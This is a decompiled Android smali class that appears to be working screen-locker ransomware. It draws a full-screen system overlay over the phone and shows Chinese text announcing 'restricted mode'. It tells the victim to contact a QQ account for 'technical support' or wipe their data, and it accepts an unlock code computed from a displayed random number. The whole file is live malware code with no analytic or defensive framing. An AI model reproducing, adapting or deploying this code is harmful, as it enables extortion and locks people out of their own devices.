.class public Lzihao/QQ1365036395/a;
.super Landroid/app/Activity;
.source "a.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lzihao/QQ1365036395/a$100000000;,
        Lzihao/QQ1365036395/a$100000001;,
        Lzihao/QQ1365036395/a$100000002;
    }
.end annotation


# static fields
.field private static isAdded:Z


# instance fields
.field private bt:Landroid/widget/Button;

.field private bt1:Landroid/widget/Button;

.field private ed:Landroid/widget/EditText;

.field intent:Landroid/content/Intent;
    .annotation runtime Ljava/lang/Override;
    .end annotation
.end field

.field private mFloatLayout:Landroid/view/View;

.field mFloatView:Landroid/widget/Button;

.field private mWindowManager:Landroid/view/WindowManager;

.field pas:I

.field pasM:I

.field private tv:Landroid/widget/TextView;

.field private tv1:Landroid/widget/TextView;

.field private tv2:Landroid/widget/TextView;

.field private tv3:Landroid/widget/TextView;

.field private tv4:Landroid/widget/TextView;

.field private tv5:Landroid/widget/TextView;

.field private wmParams:Landroid/view/WindowManager$LayoutParams;

.field private zihao:Landroid/view/View;


# direct methods
.method static final constructor <clinit>()V
    .locals 3

    const/4 v2, 0x0

    sput-boolean v2, Lzihao/QQ1365036395/a;->isAdded:Z

    return-void
.end method

.method public constructor <init>()V
    .locals 7

    .prologue
    .line 201
    move-object v0, p0

    move-object v2, v0

    invoke-direct {v2}, Landroid/app/Activity;-><init>()V

    move-object v2, v0

    invoke-static {}, Ljava/lang/Math;->random()D

    move-result-wide v3

    const/16 v5, 0x29a

    int-to-double v5, v5

    add-double/2addr v3, v5

    const/16 v5, 0xff

    int-to-double v5, v5

    mul-double/2addr v3, v5

    double-to-int v3, v3

    iput v3, v2, Lzihao/QQ1365036395/a;->pas:I

    move-object v2, v0

    move-object v3, v0

    iget v3, v3, Lzihao/QQ1365036395/a;->pas:I

    const/4 v4, 0x6

    mul-int/lit8 v3, v3, 0x6

    const v4, 0xcc1f

    sub-int/2addr v3, v4

    iput v3, v2, Lzihao/QQ1365036395/a;->pasM:I

    return-void
.end method

.method static synthetic access$L1000001(Lzihao/QQ1365036395/a;)Landroid/view/WindowManager$LayoutParams;
    .locals 4

    move-object v0, p0

    move-object v3, v0

    iget-object v3, v3, Lzihao/QQ1365036395/a;->wmParams:Landroid/view/WindowManager$LayoutParams;

    move-object v0, v3

    return-object v0
.end method

.method static synthetic access$L1000002(Lzihao/QQ1365036395/a;)Landroid/view/WindowManager;
    .locals 4

    move-object v0, p0

    move-object v3, v0

    iget-object v3, v3, Lzihao/QQ1365036395/a;->mWindowManager:Landroid/view/WindowManager;

    move-object v0, v3

    return-object v0
.end method

.method static synthetic access$L1000003(Lzihao/QQ1365036395/a;)Landroid/view/View;
    .locals 4

    move-object v0, p0

    move-object v3, v0

    iget-object v3, v3, Lzihao/QQ1365036395/a;->mFloatLayout:Landroid/view/View;

    move-object v0, v3

    return-object v0
.end method

.method static synthetic access$L1000004(Lzihao/QQ1365036395/a;)Landroid/view/View;
    .locals 4

    move-object v0, p0

    move-object v3, v0

    iget-object v3, v3, Lzihao/QQ1365036395/a;->zihao:Landroid/view/View;

    move-object v0, v3

    return-object v0
.end method

.method static synthetic access$L1000013(Lzihao/QQ1365036395/a;)Landroid/widget/EditText;
    .locals 4

    move-object v0, p0

    move-object v3, v0

    iget-object v3, v3, Lzihao/QQ1365036395/a;->ed:Landroid/widget/EditText;

    move-object v0, v3

    return-object v0
.end method

.method static synthetic access$S1000001(Lzihao/QQ1365036395/a;Landroid/view/WindowManager$LayoutParams;)V
    .locals 6

    move-object v0, p0

    move-object v1, p1

    move-object v4, v0

    move-object v5, v1

    iput-object v5, v4, Lzihao/QQ1365036395/a;->wmParams:Landroid/view/WindowManager$LayoutParams;

    return-void
.end method

.method static synthetic access$S1000002(Lzihao/QQ1365036395/a;Landroid/view/WindowManager;)V
    .locals 6

    move-object v0, p0

    move-object v1, p1

    move-object v4, v0

    move-object v5, v1

    iput-object v5, v4, Lzihao/QQ1365036395/a;->mWindowManager:Landroid/view/WindowManager;

    return-void
.end method

.method static synthetic access$S1000003(Lzihao/QQ1365036395/a;Landroid/view/View;)V
    .locals 6

    move-object v0, p0

    move-object v1, p1

    move-object v4, v0

    move-object v5, v1

    iput-object v5, v4, Lzihao/QQ1365036395/a;->mFloatLayout:Landroid/view/View;

    return-void
.end method

.method static synthetic access$S1000004(Lzihao/QQ1365036395/a;Landroid/view/View;)V
    .locals 6

    move-object v0, p0

    move-object v1, p1

    move-object v4, v0

    move-object v5, v1

    iput-object v5, v4, Lzihao/QQ1365036395/a;->zihao:Landroid/view/View;

    return-void
.end method

.method static synthetic access$S1000013(Lzihao/QQ1365036395/a;Landroid/widget/EditText;)V
    .locals 6

    move-object v0, p0

    move-object v1, p1

    move-object v4, v0

    move-object v5, v1

    iput-object v5, v4, Lzihao/QQ1365036395/a;->ed:Landroid/widget/EditText;

    return-void
.end method

.method private c()V
    .locals 11
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()V"
        }
    .end annotation

    .prologue
    .line 128
    move-object v0, p0

    move-object v6, v0

    new-instance v7, Landroid/view/WindowManager$LayoutParams;

    move-object v10, v7

    move-object v7, v10

    move-object v8, v10

    invoke-direct {v8}, Landroid/view/WindowManager$LayoutParams;-><init>()V

    iput-object v7, v6, Lzihao/QQ1365036395/a;->wmParams:Landroid/view/WindowManager$LayoutParams;

    .line 129
    move-object v6, v0

    move-object v7, v0

    invoke-virtual {v7}, Lzihao/QQ1365036395/a;->getApplication()Landroid/app/Application;

    move-result-object v7

    move-object v8, v0

    invoke-virtual {v8}, Lzihao/QQ1365036395/a;->getApplication()Landroid/app/Application;

    move-result-object v8

    sget-object v8, Landroid/content/Context;->WINDOW_SERVICE:Ljava/lang/String;

    invoke-virtual {v7, v8}, Landroid/app/Application;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v7

    check-cast v7, Landroid/view/WindowManager;

    iput-object v7, v6, Lzihao/QQ1365036395/a;->mWindowManager:Landroid/view/WindowManager;

    .line 130
    move-object v6, v0

    iget-object v6, v6, Lzihao/QQ1365036395/a;->wmParams:Landroid/view/WindowManager$LayoutParams;

    const/16 v7, 0x7da

    iput v7, v6, Landroid/view/WindowManager$LayoutParams;->type:I

    .line 131
    move-object v6, v0

    iget-object v6, v6, Lzihao/QQ1365036395/a;->wmParams:Landroid/view/WindowManager$LayoutParams;

    const/4 v7, 0x1

    iput v7, v6, Landroid/view/WindowManager$LayoutParams;->format:I

    .line 132
    move-object v6, v0

    iget-object v6, v6, Lzihao/QQ1365036395/a;->wmParams:Landroid/view/WindowManager$LayoutParams;

    const/16 v7, 0xa0

    iput v7, v6, Landroid/view/WindowManager$LayoutParams;->flags:I

    .line 133
    move-object v6, v0

    iget-object v6, v6, Lzihao/QQ1365036395/a;->wmParams:Landroid/view/WindowManager$LayoutParams;

    const/16 v7, 0x31

    iput v7, v6, Landroid/view/WindowManager$LayoutParams;->gravity:I

    .line 134
    const/16 v6, -0xa0

    move v1, v6

    .line 135
    move-object v6, v0

    iget-object v6, v6, Lzihao/QQ1365036395/a;->wmParams:Landroid/view/WindowManager$LayoutParams;

    move v7, v1

    iput v7, v6, Landroid/view/WindowManager$LayoutParams;->x:I

    .line 136
    const/16 v6, 0x96

    move v2, v6

    .line 137
    move-object v6, v0

    iget-object v6, v6, Lzihao/QQ1365036395/a;->wmParams:Landroid/view/WindowManager$LayoutParams;

    move v7, v2

    iput v7, v6, Landroid/view/WindowManager$LayoutParams;->y:I

    .line 138
    move-object v6, v0

    iget-object v6, v6, Lzihao/QQ1365036395/a;->wmParams:Landroid/view/WindowManager$LayoutParams;

    const/4 v7, -0x2

    iput v7, v6, Landroid/view/ViewGroup$LayoutParams;->width:I

    .line 139
    move-object v6, v0

    iget-object v6, v6, Lzihao/QQ1365036395/a;->wmParams:Landroid/view/WindowManager$LayoutParams;

    const/4 v7, -0x2

    iput v7, v6, Landroid/view/ViewGroup$LayoutParams;->height:I

    .line 140
    move-object v6, v0

    invoke-virtual {v6}, Lzihao/QQ1365036395/a;->getApplication()Landroid/app/Application;

    move-result-object v6

    invoke-static {v6}, Landroid/view/LayoutInflater;->from(Landroid/content/Context;)Landroid/view/LayoutInflater;

    move-result-object v6

    move-object v3, v6

    .line 141
    move-object v6, v0

    move-object v7, v3

    const v8, 0x7f030001

    const/4 v9, 0x0

    check-cast v9, Landroid/view/ViewGroup;

    invoke-virtual {v7, v8, v9}, Landroid/view/LayoutInflater;->inflate(ILandroid/view/ViewGroup;)Landroid/view/View;

    move-result-object v7

    iput-object v7, v6, Lzihao/QQ1365036395/a;->mFloatLayout:Landroid/view/View;

    .line 142
    move-object v6, v0

    iget-object v6, v6, Lzihao/QQ1365036395/a;->mWindowManager:Landroid/view/WindowManager;

    move-object v7, v0

    iget-object v7, v7, Lzihao/QQ1365036395/a;->mFloatLayout:Landroid/view/View;

    move-object v8, v0

    iget-object v8, v8, Lzihao/QQ1365036395/a;->wmParams:Landroid/view/WindowManager$LayoutParams;

    invoke-interface {v6, v7, v8}, Landroid/view/WindowManager;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    .line 143
    move-object v6, v0

    move-object v7, v0

    iget-object v7, v7, Lzihao/QQ1365036395/a;->mFloatLayout:Landroid/view/View;

    const v8, 0x7f070008

    invoke-virtual {v7, v8}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v7

    check-cast v7, Landroid/widget/Button;

    iput-object v7, v6, Lzihao/QQ1365036395/a;->bt:Landroid/widget/Button;

    .line 144
    move-object v6, v0

    move-object v7, v0

    iget-object v7, v7, Lzihao/QQ1365036395/a;->mFloatLayout:Landroid/view/View;

    const v8, 0x7f070007

    invoke-virtual {v7, v8}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v7

    check-cast v7, Landroid/widget/EditText;

    iput-object v7, v6, Lzihao/QQ1365036395/a;->ed:Landroid/widget/EditText;

    .line 145
    move-object v6, v0

    move-object v7, v0

    iget-object v7, v7, Lzihao/QQ1365036395/a;->mFloatLayout:Landroid/view/View;

    const/high16 v8, 0x7f070000

    invoke-virtual {v7, v8}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v7

    check-cast v7, Landroid/widget/TextView;

    iput-object v7, v6, Lzihao/QQ1365036395/a;->tv:Landroid/widget/TextView;

    .line 146
    move-object v6, v0

    move-object v7, v0

    iget-object v7, v7, Lzihao/QQ1365036395/a;->mFloatLayout:Landroid/view/View;

    const v8, 0x7f070006

    invoke-virtual {v7, v8}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v7

    check-cast v7, Landroid/widget/TextView;

    iput-object v7, v6, Lzihao/QQ1365036395/a;->tv5:Landroid/widget/TextView;

    .line 147
    invoke-static {}, Ljava/lang/Math;->random()D

    move-result-wide v6

    const/16 v8, 0x29a

    int-to-double v8, v8

    add-double/2addr v6, v8

    const/16 v8, 0xff

    int-to-double v8, v8

    mul-double/2addr v6, v8

    double-to-int v6, v6

    move v4, v6

    .line 148
    move-object v6, v0

    move v7, v4

    const/4 v8, 0x6

    mul-int/lit8 v7, v7, 0x6

    const/16 v8, 0x208

    add-int/lit16 v7, v7, -0x208

    iput v7, v6, Lzihao/QQ1365036395/a;->pasM:I

    .line 149
    move-object v6, v0

    iget-object v6, v6, Lzihao/QQ1365036395/a;->tv5:Landroid/widget/TextView;

    new-instance v7, Ljava/lang/StringBuffer;

    move-object v10, v7

    move-object v7, v10

    move-object v8, v10

    invoke-direct {v8}, Ljava/lang/StringBuffer;-><init>()V

    const-string v8, "\u968f\u673a\u7801:"

    invoke-virtual {v7, v8}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v7

    move v8, v4

    invoke-virtual {v7, v8}, Ljava/lang/StringBuffer;->append(I)Ljava/lang/StringBuffer;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    .line 150
    move-object v6, v0

    iget-object v6, v6, Lzihao/QQ1365036395/a;->tv:Landroid/widget/TextView;

    const-string v7, "QQ666"

    invoke-virtual {v6, v7}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    .line 151
    move-object v6, v0

    iget-object v6, v6, Lzihao/QQ1365036395/a;->bt:Landroid/widget/Button;

    const-string v7, "\u89e3\u9501"

    invoke-virtual {v6, v7}, Landroid/widget/Button;->setText(Ljava/lang/CharSequence;)V

    .line 152
    move-object v6, v0

    iget-object v6, v6, Lzihao/QQ1365036395/a;->bt:Landroid/widget/Button;

    new-instance v7, Lzihao/QQ1365036395/a$100000001;

    move-object v10, v7

    move-object v7, v10

    move-object v8, v10

    move-object v9, v0

    invoke-direct {v8, v9}, Lzihao/QQ1365036395/a$100000001;-><init>(Lzihao/QQ1365036395/a;)V

    invoke-virtual {v6, v7}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 176
    const/4 v6, 0x1

    sput-boolean v6, Lzihao/QQ1365036395/a;->isAdded:Z

    .line 178
    move-object v6, v0

    iget-object v6, v6, Lzihao/QQ1365036395/a;->mFloatLayout:Landroid/view/View;

    new-instance v7, Lzihao/QQ1365036395/a$100000002;

    move-object v10, v7

    move-object v7, v10

    move-object v8, v10

    move-object v9, v0

    invoke-direct {v8, v9}, Lzihao/QQ1365036395/a$100000002;-><init>(Lzihao/QQ1365036395/a;)V

    invoke-virtual {v6, v7}, Landroid/view/View;->setOnTouchListener(Landroid/view/View$OnTouchListener;)V

    return-void
.end method

.method private d()V
    .locals 8
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()V"
        }
    .end annotation

    .prologue
    .line 53
    move-object v0, p0

    move-object v3, v0

    new-instance v4, Landroid/view/WindowManager$LayoutParams;

    move-object v7, v4

    move-object v4, v7

    move-object v5, v7

    invoke-direct {v5}, Landroid/view/WindowManager$LayoutParams;-><init>()V

    iput-object v4, v3, Lzihao/QQ1365036395/a;->wmParams:Landroid/view/WindowManager$LayoutParams;

    .line 55
    move-object v3, v0

    move-object v4, v0

    invoke-virtual {v4}, Lzihao/QQ1365036395/a;->getApplication()Landroid/app/Application;

    move-result-object v4

    move-object v5, v0

    invoke-virtual {v5}, Lzihao/QQ1365036395/a;->getApplication()Landroid/app/Application;

    move-result-object v5

    sget-object v5, Landroid/content/Context;->WINDOW_SERVICE:Ljava/lang/String;

    invoke-virtual {v4, v5}, Landroid/app/Application;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v4

    check-cast v4, Landroid/view/WindowManager;

    iput-object v4, v3, Lzihao/QQ1365036395/a;->mWindowManager:Landroid/view/WindowManager;

    .line 58
    move-object v3, v0

    iget-object v3, v3, Lzihao/QQ1365036395/a;->wmParams:Landroid/view/WindowManager$LayoutParams;

    const/16 v4, 0x7da

    iput v4, v3, Landroid/view/WindowManager$LayoutParams;->type:I

    .line 66
    move-object v3, v0

    iget-object v3, v3, Lzihao/QQ1365036395/a;->wmParams:Landroid/view/WindowManager$LayoutParams;

    const/4 v4, 0x1

    iput v4, v3, Landroid/view/WindowManager$LayoutParams;->format:I

    .line 72
    move-object v3, v0

    iget-object v3, v3, Lzihao/QQ1365036395/a;->wmParams:Landroid/view/WindowManager$LayoutParams;

    const/16 v4, 0x500

    iput v4, v3, Landroid/view/WindowManager$LayoutParams;->flags:I

    .line 79
    move-object v3, v0

    iget-object v3, v3, Lzihao/QQ1365036395/a;->wmParams:Landroid/view/WindowManager$LayoutParams;

    const/16 v4, 0x31

    iput v4, v3, Landroid/view/WindowManager$LayoutParams;->gravity:I

    .line 81
    move-object v3, v0

    iget-object v3, v3, Lzihao/QQ1365036395/a;->wmParams:Landroid/view/WindowManager$LayoutParams;

    const/4 v4, 0x0

    iput v4, v3, Landroid/view/WindowManager$LayoutParams;->x:I

    .line 82
    move-object v3, v0

    iget-object v3, v3, Lzihao/QQ1365036395/a;->wmParams:Landroid/view/WindowManager$LayoutParams;

    const/4 v4, 0x0

    iput v4, v3, Landroid/view/WindowManager$LayoutParams;->y:I

    .line 84
    move-object v3, v0

    iget-object v3, v3, Lzihao/QQ1365036395/a;->wmParams:Landroid/view/WindowManager$LayoutParams;

    const/4 v4, -0x1

    iput v4, v3, Landroid/view/ViewGroup$LayoutParams;->width:I

    .line 85
    move-object v3, v0

    iget-object v3, v3, Lzihao/QQ1365036395/a;->wmParams:Landroid/view/WindowManager$LayoutParams;

    const/4 v4, -0x1

    iput v4, v3, Landroid/view/ViewGroup$LayoutParams;->height:I

    .line 90
    move-object v3, v0

    invoke-virtual {v3}, Lzihao/QQ1365036395/a;->getApplication()Landroid/app/Application;

    move-result-object v3

    invoke-static {v3}, Landroid/view/LayoutInflater;->from(Landroid/content/Context;)Landroid/view/LayoutInflater;

    move-result-object v3

    move-object v1, v3

    .line 92
    move-object v3, v0

    move-object v4, v1

    const/high16 v5, 0x7f030000

    const/4 v6, 0x0

    check-cast v6, Landroid/view/ViewGroup;

    invoke-virtual {v4, v5, v6}, Landroid/view/LayoutInflater;->inflate(ILandroid/view/ViewGroup;)Landroid/view/View;

    move-result-object v4

    iput-object v4, v3, Lzihao/QQ1365036395/a;->zihao:Landroid/view/View;

    .line 96
    move-object v3, v0

    iget-object v3, v3, Lzihao/QQ1365036395/a;->mWindowManager:Landroid/view/WindowManager;

    move-object v4, v0

    iget-object v4, v4, Lzihao/QQ1365036395/a;->zihao:Landroid/view/View;

    move-object v5, v0

    iget-object v5, v5, Lzihao/QQ1365036395/a;->wmParams:Landroid/view/WindowManager$LayoutParams;

    invoke-interface {v3, v4, v5}, Landroid/view/WindowManager;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    .line 97
    move-object v3, v0

    move-object v4, v0

    iget-object v4, v4, Lzihao/QQ1365036395/a;->zihao:Landroid/view/View;

    const v5, 0x7f070004

    invoke-virtual {v4, v5}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v4

    check-cast v4, Landroid/widget/Button;

    iput-object v4, v3, Lzihao/QQ1365036395/a;->bt1:Landroid/widget/Button;

    .line 98
    move-object v3, v0

    move-object v4, v0

    iget-object v4, v4, Lzihao/QQ1365036395/a;->zihao:Landroid/view/View;

    const/high16 v5, 0x7f070000

    invoke-virtual {v4, v5}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v4

    check-cast v4, Landroid/widget/TextView;

    iput-object v4, v3, Lzihao/QQ1365036395/a;->tv:Landroid/widget/TextView;

    .line 99
    move-object v3, v0

    move-object v4, v0

    iget-object v4, v4, Lzihao/QQ1365036395/a;->zihao:Landroid/view/View;

    const v5, 0x7f070001

    invoke-virtual {v4, v5}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v4

    check-cast v4, Landroid/widget/TextView;

    iput-object v4, v3, Lzihao/QQ1365036395/a;->tv1:Landroid/widget/TextView;

    .line 100
    move-object v3, v0

    move-object v4, v0

    iget-object v4, v4, Lzihao/QQ1365036395/a;->zihao:Landroid/view/View;

    const v5, 0x7f070002

    invoke-virtual {v4, v5}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v4

    check-cast v4, Landroid/widget/TextView;

    iput-object v4, v3, Lzihao/QQ1365036395/a;->tv2:Landroid/widget/TextView;

    .line 101
    move-object v3, v0

    move-object v4, v0

    iget-object v4, v4, Lzihao/QQ1365036395/a;->zihao:Landroid/view/View;

    const v5, 0x7f070003

    invoke-virtual {v4, v5}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v4

    check-cast v4, Landroid/widget/TextView;

    iput-object v4, v3, Lzihao/QQ1365036395/a;->tv3:Landroid/widget/TextView;

    .line 102
    move-object v3, v0

    move-object v4, v0

    iget-object v4, v4, Lzihao/QQ1365036395/a;->zihao:Landroid/view/View;

    const v5, 0x7f070005

    invoke-virtual {v4, v5}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v4

    check-cast v4, Landroid/widget/TextView;

    iput-object v4, v3, Lzihao/QQ1365036395/a;->tv4:Landroid/widget/TextView;

    .line 103
    move-object v3, v0

    iget-object v3, v3, Lzihao/QQ1365036395/a;->tv:Landroid/widget/TextView;

    const-string v4, "\u5df2\u542f\u7528\u9650\u5236\u6a21\u5f0f"

    invoke-virtual {v3, v4}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    .line 104
    move-object v3, v0

    iget-object v3, v3, Lzihao/QQ1365036395/a;->tv1:Landroid/widget/TextView;

    const-string v4, "\u6211\u82e5\u6210\u9b54,\u4f5b\u5948\u6211\u4f55"

    invoke-virtual {v3, v4}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    .line 105
    move-object v3, v0

    iget-object v3, v3, Lzihao/QQ1365036395/a;->tv2:Landroid/widget/TextView;

    const-string v4, "\u6211\u82e5\u6210\u4f5b,\u9b54\u5948\u6211\u4f55"

    invoke-virtual {v3, v4}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    .line 106
    move-object v3, v0

    iget-object v3, v3, Lzihao/QQ1365036395/a;->tv3:Landroid/widget/TextView;

    const-string v4, "\u9664\u4e86\u6e05\u9664\u6570\u636e\n\u4e0d\u7136\u52a0\u6211QQ666"

    invoke-virtual {v3, v4}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    .line 107
    move-object v3, v0

    iget-object v3, v3, Lzihao/QQ1365036395/a;->tv4:Landroid/widget/TextView;

    const-string v4, "\u6280\u672f\u652f\u6301 QQ:666"

    invoke-virtual {v3, v4}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    .line 108
    move-object v3, v0

    iget-object v3, v3, Lzihao/QQ1365036395/a;->bt1:Landroid/widget/Button;

    const-string v4, "\u542f\u52a8QQ\u5bfb\u6c42\u5e2e\u52a9"

    invoke-virtual {v3, v4}, Landroid/widget/Button;->setText(Ljava/lang/CharSequence;)V

    .line 109
    move-object v3, v0

    iget-object v3, v3, Lzihao/QQ1365036395/a;->bt1:Landroid/widget/Button;

    new-instance v4, Lzihao/QQ1365036395/a$100000000;

    move-object v7, v4

    move-object v4, v7

    move-object v5, v7

    move-object v6, v0

    invoke-direct {v5, v6}, Lzihao/QQ1365036395/a$100000000;-><init>(Lzihao/QQ1365036395/a;)V

    invoke-virtual {v3, v4}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    return-void
.end method


# virtual methods
.method public com_sec_plugin_action_APP_STARTED()V
    .locals 7
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()V"
        }
    .end annotation

    .prologue
    .line 18
    move-object v0, p0

    move-object v2, v0

    new-instance v3, Landroid/content/Intent;

    move-object v6, v3

    move-object v3, v6

    move-object v4, v6

    const-string v5, "com.secneo.plugin.action.APP_STARTED"

    invoke-direct {v4, v5}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2, v3}, Lzihao/QQ1365036395/a;->sendBroadcast(Landroid/content/Intent;)V

    return-void
.end method

.method public onAttachedToWindow()V
    .locals 3
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()V"
        }
    .end annotation

    .annotation runtime Ljava/lang/Override;
    .end annotation

    .prologue
    .line 49
    move-object v0, p0

    move-object v2, v0

    invoke-super {v2}, Landroid/app/Activity;->onAttachedToWindow()V

    return-void
.end method

.method public onCreate(Landroid/os/Bundle;)V
    .locals 11
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/os/Bundle;",
            ")V"
        }
    .end annotation

    .prologue
    move-object v0, p0

    move-object v1, p1

    move-object v4, v0

    invoke-static {v4}, LLogCatBroadcaster;->start(Landroid/content/Context;)V

    .line 33
    move-object v4, v0

    move-object v5, v1

    invoke-super {v4, v5}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    .line 34
    move-object v4, v0

    const/high16 v5, 0x7f030000

    invoke-virtual {v4, v5}, Lzihao/QQ1365036395/a;->setContentView(I)V

    .line 35
    move-object v4, v0

    new-instance v5, Landroid/content/Intent;

    move-object v10, v5

    move-object v5, v10

    move-object v6, v10

    invoke-direct {v6}, Landroid/content/Intent;-><init>()V

    iput-object v5, v4, Lzihao/QQ1365036395/a;->intent:Landroid/content/Intent;

    .line 36
    move-object v4, v0

    iget-object v4, v4, Lzihao/QQ1365036395/a;->intent:Landroid/content/Intent;

    move-object v5, v0

    :try_start_0
    const-string v6, "zihao.QQ1365036395.c"

    invoke-static {v6}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;
    :try_end_0
    .catch Ljava/lang/ClassNotFoundException; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v6

    invoke-virtual {v4, v5, v6}, Landroid/content/Intent;->setClass(Landroid/content/Context;Ljava/lang/Class;)Landroid/content/Intent;

    move-result-object v4

    .line 37
    move-object v4, v0

    move-object v5, v0

    iget-object v5, v5, Lzihao/QQ1365036395/a;->intent:Landroid/content/Intent;

    invoke-virtual {v4, v5}, Lzihao/QQ1365036395/a;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    move-result-object v4

    .line 38
    sget-boolean v4, Lzihao/QQ1365036395/a;->isAdded:Z

    if-nez v4, :cond_0

    .line 39
    move-object v4, v0

    invoke-direct {v4}, Lzihao/QQ1365036395/a;->d()V

    .line 40
    move-object v4, v0

    invoke-direct {v4}, Lzihao/QQ1365036395/a;->c()V

    .line 42
    :goto_0
    return-void

    .line 36
    :catch_0
    move-exception v4

    move-object v2, v4

    new-instance v4, Ljava/lang/NoClassDefFoundError;

    move-object v10, v4

    move-object v4, v10

    move-object v5, v10

    move-object v6, v2

    invoke-virtual {v6}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v6

    invoke-direct {v5, v6}, Ljava/lang/NoClassDefFoundError;-><init>(Ljava/lang/String;)V

    throw v4

    .line 42
    :cond_0
    const/4 v4, 0x0

    invoke-static {v4}, Ljava/lang/System;->exit(I)V

    goto :goto_0
.end method
